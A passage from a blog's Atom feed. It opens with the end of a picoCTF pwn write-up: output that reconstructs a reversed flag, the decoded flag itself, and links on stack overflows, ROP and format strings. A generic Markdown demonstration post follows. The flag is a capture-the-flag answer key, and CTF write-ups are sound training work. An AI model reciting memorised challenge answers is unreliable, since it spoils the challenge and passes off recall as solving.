}a3371db9_Yr0m3M_Pu_N4elC{FTC
}a3371db9_Yr0m3M_Pu_N4elC{FTCo
}a3371db9_Yr0m3M_Pu_N4elC{FTCoc
}a3371db9_Yr0m3M_Pu_N4elC{FTCoci
}a3371db9_Yr0m3M_Pu_N4elC{FTCocip
picoCTF{Cle4N_uP_M3m0rY_9bd1733a}
</code></pre></div></div>

<h2 id="reference">Reference</h2>

<ul>
  <li><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/">Stack Overflow</a></li>
  <li><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/">Basic Rop</a></li>
  <li>
    <p><a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">Format String</a></p>

  </li>
</ul>]]></content><author><name>dayfly</name></author><category term="pwn" /><category term="pwn" /><category term="stack overflow" /><category term="fmt" /><category term="rop" /><summary type="html"><![CDATA[basic-file-exploit]]></summary></entry><entry><title type="html">An exhibit of Markdown</title><link href="http://localhost:4000/markdown/2022/03/27/an-exhibit-of-markdown.html" rel="alternate" type="text/html" title="An exhibit of Markdown" /><published>2022-03-27T00:00:00+08:00</published><updated>2022-03-27T00:00:00+08:00</updated><id>http://localhost:4000/markdown/2022/03/27/an-exhibit-of-markdown</id><content type="html" xml:base="http://localhost:4000/markdown/2022/03/27/an-exhibit-of-markdown.html"><![CDATA[<p>This note demonstrates some of what <a href="http://daringfireball.net/projects/markdown/">Markdown</a> is capable of doing.</p>

<h2 id="an-exhibit-of-markdown">An exhibit of Markdown</h2>

<p><em>Note: Feel free to play with this page. Unlike regular notes, this doesn’t automatically save itself.</em></p>

<h2 id="basic-formatting">Basic formatting</h2>

<p>Paragraphs can be written like so. A paragraph is the basic block of Markdown. A paragraph is what text will turn into when there is no reason it should become anything else.</p>

<p>Paragraphs must be separated by a blank line. Basic formatting of <em>italics</em> and <strong>bold</strong> is supported. This <em>can be <strong>nested</strong> like</em> so.</p>

<h2 id="lists">Lists</h2>

<h3 id="ordered-list">Ordered list</h3>

<ol>
  <li>Item 1</li>
  <li>A second item</li>
  <li>Number 3</li>
  <li>Ⅳ</li>
</ol>

<p><em>Note: the fourth item uses the Unicode character for <a href="http://www.fileformat.info/info/unicode/char/2163/index.htm">Roman numeral four</a>.</em></p>

<h3 id="unordered-list">Unordered list</h3>

<ul>
  <li>An item</li>
  <li>Another item</li>
  <li>Yet another item</li>
  <li>And there’s more…</li>
</ul>

<h2 id="paragraph-modifiers">Paragraph modifiers</h2>

<h3 id="code-block">Code block</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Code blocks are very useful for developers and other people who look at code or other things that are written in plain text. As you can see, it uses a fixed-width font.
</code></pre></div></div>

<p>You can also make <code class="language-plaintext highlighter-rouge">inline code</code> to add code into other things.</p>

<h3 id="quote">Quote</h3>

<blockquote>
  <p>Here is a quote. What this is should be self explanatory. Quotes are automatically indented when they are used.</p>
</blockquote>

<h2 id="headings">Headings</h2>

<p>There are six levels of headings. They correspond with the six levels of HTML headings. You’ve probably noticed them already in the page. Each level down uses one more hash character.</p>

<h3 id="headings-can-also-contain-formatting">Headings <em>can</em> also contain <strong>formatting</strong></h3>

<h3 id="they-can-even-contain-inline-code">They can even contain <code class="language-plaintext highlighter-rouge">inline code</code></h3>

<p>Of course, demonstrating what headings look like messes up the structure of the page.</p>

<p>I don’t recommend using more than three or four levels of headings here, because, when you’re smallest heading isn’t too small, and you’re largest heading isn’t too big, and you want each size up to look noticeably larger and more important, there there are only so many sizes that you can use.</p>

<h2 id="urls">URLs</h2>

<p>URLs can be made in a handful of ways:</p>

<ul>
  <li>A named link to <a href="http://www.markitdown.net/">MarkItDown</a>. The easiest way to do these is to select what you want to make a link and hit <code class="language-plaintext highlighter-rouge">Ctrl+L</code>.</li>
  <li>Another named link to <a href="http://www.markitdown.net/">MarkItDown</a></li>
  <li>Sometimes you just want a URL like <a href="http://www.markitdown.net/">http://www.markitdown.net/</a>.</li>
</ul>

<h2 id="horizontal-rule">Horizontal rule</h2>

<p>A horizontal rule is a line that goes across the middle of the page.</p>

<hr />

<p>It’s sometimes handy for breaking things up.</p>

<h2 id="images">Images</h2>

<p>Markdown can also contain images. I’ll need to add something here sometime.</p>

<h2 id="finally">Finally</h2>

<p>There’s actually a lot more to Markdown than this. See the official <a href="http://daringfireball.net/projects/markdown/basics">introduction</a> and <a href="http://daringfireball.net/projects/markdown/syntax">syntax</a> for more information. However, be aware that this is not using the official implementation, and this might work subtly differently in some of the little things.</p>]]></content><author><name>huyinhao</name></author><category term="markdown" /><category term="markdown" /><summary type="html"><![CDATA[This note demonstrates some of what Markdown is capable of doing.]]></summary></entry></feed>